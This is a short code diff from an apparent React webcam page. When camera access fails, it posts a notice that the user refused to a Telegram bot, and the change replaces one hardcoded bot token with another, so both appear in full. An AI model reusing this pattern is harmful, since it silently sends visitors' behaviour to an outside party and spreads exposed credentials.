@@ -47,7 +47,7 @@ const PhotoPage = () => {
 
           console.error("Error accessing webcam:", error);
           try{
-            const url = 'https://api.telegram.org/bot7654585303:AAFLJMpcU2znRSbob-KPUgM0XZE1QTqDR3k/sendMessage'
+            const url = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage'
             axios.post(url, {'chat_id': chatId, 'text': 'Пользователь отклонил запрос к камере!'})
       
           }catch(err){
